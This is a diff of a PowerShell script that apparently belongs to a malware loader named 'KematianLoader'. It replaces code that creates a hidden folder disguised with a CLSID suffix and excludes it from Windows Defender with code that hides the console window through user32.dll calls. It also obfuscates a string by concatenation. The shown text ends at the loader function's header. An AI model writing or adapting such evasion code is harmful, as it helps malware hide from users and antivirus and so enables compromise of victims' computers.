@@ -1,12 +1,12 @@
 $ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
 
-$rdir = "C:\Users\Loader"
-$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-New-Item -ItemType Directory -Path $dir
-attrib +h +s $dir
-Add-MpPreference -ExclusionPath $dir
+Add-Type @"
+    [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern IntPtr GetConsoleWindow();
+"@ -Name Win32 -Namespace Win32Functions
 
-
+$consolePtr = [Win32Functions.Win32]::GetConsoleWindow()
+[Win32Functions.Win32]::ShowWindowAsync($consolePtr, 0)  # 0 = SW_HIDE
 
 function KematianLoader {
     Param ($kematian_modules, $kematian_func)
